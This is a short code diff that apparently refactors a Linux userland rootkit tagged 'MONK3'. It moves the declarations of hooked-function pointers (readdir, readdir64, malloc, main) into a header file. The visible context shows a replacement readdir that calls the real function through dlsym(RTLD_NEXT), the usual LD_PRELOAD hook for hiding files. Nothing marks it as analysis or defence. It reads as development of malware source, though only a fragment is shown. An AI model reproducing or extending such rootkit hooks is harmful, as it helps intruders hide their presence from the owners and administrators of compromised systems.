@@ -5,13 +5,7 @@
 #include <dirent.h>
 #include <string.h>
 #include "res/config.h"
-
-#define RK_INFO "\e[1;31m[\e[0mMONK3\e[1;31m]\e[0m --> "
-
-struct dirent *(*orig_readdir)(DIR *dir);
-struct dirent64 *(*orig_readdir64)(DIR *dir);
-static void *(*orig_malloc)(size_t) = NULL;
-static int (*orig_main)(int, char **, char **);
+#include "res/prototypes.h"
 
 struct dirent *readdir(DIR *dirp) {
     orig_readdir = dlsym(RTLD_NEXT, "readdir");
